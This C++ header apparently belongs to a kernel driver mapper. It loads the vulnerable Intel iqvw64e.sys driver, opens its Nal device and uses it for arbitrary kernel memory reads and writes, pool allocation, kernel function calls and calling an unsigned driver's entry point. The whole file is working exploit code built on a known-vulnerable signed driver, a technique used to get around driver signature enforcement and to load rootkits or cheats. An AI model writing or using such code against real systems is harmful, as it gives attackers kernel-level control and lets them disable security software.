#pragma once
#include "intel_driver.h"
#include <cstdint>
#include <iostream>
#include <windows.h>


// ============================================================================
// Kernel Access Primitives - Auto-detects Intel driver version
// ============================================================================
namespace KernelAccess {

inline bool Initialize() {
  std::cout << "[*] Getting ntoskrnl base...\n";
  Intel::g_NtBase = Intel::GetNtoskrnlBase();
  if (!Intel::g_NtBase) {
    std::cerr << "[!] Failed to get ntoskrnl base.\n";
    return false;
  }
  std::cout << "[+] ntoskrnl base: 0x" << std::hex << Intel::g_NtBase
            << std::dec << "\n";

  std::cout << "[*] Loading Intel driver (iqvw64e.sys)...\n";
  if (!Intel::LoadService()) {
    std::cerr << "[!] Failed to load Intel driver service.\n";
    return false;
  }
  std::cout << "[+] Intel driver service loaded.\n";

  Intel::g_hDev =
      CreateFileW(L"\\\\.\\Nal", GENERIC_READ | GENERIC_WRITE, 0, nullptr,
                  OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
  if (Intel::g_hDev == INVALID_HANDLE_VALUE) {
    std::cerr << "[!] Failed to open \\\\.\\Nal device: " << GetLastError()
              << "\n";
    Intel::UnloadService();
    return false;
  }
  std::cout << "[+] Intel device opened.\n";

  // Auto-detect driver style
  if (!Intel::DetectDriverStyle()) {
    std::cerr << "[!] Could not communicate with Intel driver.\n";
    CloseHandle(Intel::g_hDev);
    Intel::UnloadService();
    return false;
  }

  // If using old-style, we need CR3 for kernel R/W
  if (!Intel::g_UseNewStyle) {
    Intel::g_CR3 = Intel::FindCR3();
    if (!Intel::g_CR3) {
      std::cerr << "[!] Failed to find System CR3.\n";
      CloseHandle(Intel::g_hDev);
      Intel::UnloadService();
      return false;
    }
  }

  // Sanity check: read ntoskrnl MZ signature
  uint16_t mzSig = 0;
  Intel::ReadKernel(Intel::g_NtBase, &mzSig, 2);
  if (mzSig != 0x5A4D) {
    std::cerr << "[!] Kernel R/W sanity check failed (MZ sig: 0x" << std::hex
              << mzSig << std::dec << ")\n";
    CloseHandle(Intel::g_hDev);
    Intel::UnloadService();
    return false;
  }
  std::cout << "[+] Kernel R/W verified (MZ signature OK).\n";
  std::cout << "[+] Kernel access initialized successfully!\n";
  return true;
}

inline uint64_t AllocateKernelMemory(size_t size) {
  uint64_t exAllocatePool = Intel::GetNtExport("ExAllocatePool");
  if (!exAllocatePool) {
    exAllocatePool = Intel::GetNtExport("ExAllocatePoolWithTag");
    if (!exAllocatePool) {
      std::cerr << "[!] ExAllocatePool not found.\n";
      return 0;
    }
    return Intel::CallKernelFn(exAllocatePool, 0, size, 0x0070614D);
  }
  return Intel::CallKernelFn(exAllocatePool, 0, size);
}

inline bool WriteKernelMemory(uint64_t dest, void *src, size_t size) {
  return Intel::WriteKernel(dest, src, size);
}

inline bool ReadKernelMemory(uint64_t src, void *dest, size_t size) {
  return Intel::ReadKernel(src, dest, size);
}

inline void FreeKernelMemory(uint64_t address) {
  if (!address)
    return;
  uint64_t exFreePool = Intel::GetNtExport("ExFreePool");
  if (exFreePool)
    Intel::CallKernelFn(exFreePool, address);
}

inline uint64_t CallDriverEntry(uint64_t entryPoint) {
  return Intel::CallKernelFn(entryPoint, 0, 0);
}

inline void Cleanup() {
  if (Intel::g_hDev != INVALID_HANDLE_VALUE) {
    CloseHandle(Intel::g_hDev);
    Intel::g_hDev = INVALID_HANDLE_VALUE;
  }
  Intel::UnloadService();
  std::cout << "[+] Intel driver unloaded.\n";
}
} // namespace KernelAccess
